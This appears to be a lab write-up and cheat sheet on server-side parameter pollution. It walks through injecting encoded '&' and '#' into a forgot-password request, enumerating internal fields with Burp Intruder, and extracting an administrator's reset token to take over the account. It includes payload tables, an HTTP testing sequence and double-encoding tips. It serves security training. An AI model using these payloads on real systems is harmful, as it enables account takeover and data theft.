# Server-Side Parameter Pollution — Query String

## When this applies

- Frontend forwards `username` from form to a backend internal API: `internal://api/users?username=<input>`.
- Backend builds the URL as `users?username=` + raw user input — allowing `&`-injection.
- Goal: append `&field=reset_token#` to extract sensitive fields from the internal API.

## Technique

Inject `%26` (`&`) and `%23` (`#`) into the user-controlled parameter to add new parameters or truncate the trailing internal-only parameters. Enumerate field names via Burp Intruder against a wordlist of "Server-side variable names". Extract values like password reset token, email, internal IDs.

## Steps

### Lab — Extract administrator's password reset token

**Phase 1: Discovery**
1. Initiate password reset for administrator
2. Examine `/forgot-password` POST request
3. Test invalid username → "Invalid username" error

**Phase 2: Injection Testing**
4. Inject `%26x=y` → "Parameter is not supported"
5. Use `%23` truncation → "Field not specified"
6. Inject `username=administrator%26field=x%23` → "Invalid field"

**Phase 3: Parameter Enumeration**
7. Use Burp Intruder with payload: `administrator%26field=§PARAM§%23`
8. Wordlist: "Server-side variable names"
9. Identify valid fields: `email`, `username`, `reset_token`

**Phase 4: Exploitation**
10. Request: `username=administrator%26field=reset_token%23`
11. Server returns password reset token
12. Use token to reset administrator password

### Key payloads

| Payload | URL-Encoded | Purpose | Result |
|---------|-------------|---------|--------|
| `admin#` | `admin%23` | Truncate query | Field not specified |
| `admin&x=y` | `admin%26x=y` | Inject parameter | Parameter not supported |
| `admin&field=x#` | `admin%26field=x%23` | Add field param | Invalid field |
| `admin&field=reset_token#` | `admin%26field=reset_token%23` | Extract token | Token returned |

### Error messages & meaning

| Error | Meaning | Next Action |
|-------|---------|-------------|
| Invalid username | Validation active | Use valid username |
| Parameter not supported | Injection detected | Continue manipulation |
| Field not specified | Additional params exist | Inject field parameter |
| Invalid field | Field param recognized | Brute-force valid fields |

### Query string testing characters

```
# (%23) - Truncate query string
& (%26) - Add new parameter
= (%3D) - Parameter assignment
? (%3F) - Query string start
; (%3B) - Parameter separator
%00 - Null byte injection
```

### Testing methodology

```http
# 1. Baseline
POST /api/forgot-password
username=admin

# 2. Truncation
username=admin%23

# 3. Parameter Injection
username=admin%26debug=true

# 4. Parameter Discovery
username=admin%26field=§PARAM§%23

# 5. Exploitation
username=admin%26field=reset_token%23
```

### Technology-specific HPP behavior

- **PHP:** Uses last parameter value
- **ASP.NET:** Combines with commas
- **Node.js/Express:** Uses first value
- **Python/Flask:** Returns list of all values

## Verifying success

- Injecting `%26` produces a different error message than no injection — confirms the input reaches a URL builder.
- Brute-forcing field names returns a token / email / privileged data in the response.
- The recovered token authenticates successfully against the application.

## Common pitfalls

- Some apps URL-encode user input before forwarding — `%26` becomes `%2526`, breaking the injection. Try double-encoding.
- The internal API may require additional context parameters — append them via more `%26`.
- Some validators reject `#` — test `%23` and unencoded both ways.

## Tools

- Burp Suite Repeater + Intruder
- SecLists `Discovery/Web-Content/api/`
- "Server-side variable names" wordlist (in PortSwigger material)
- curl with URL-encoded payloads
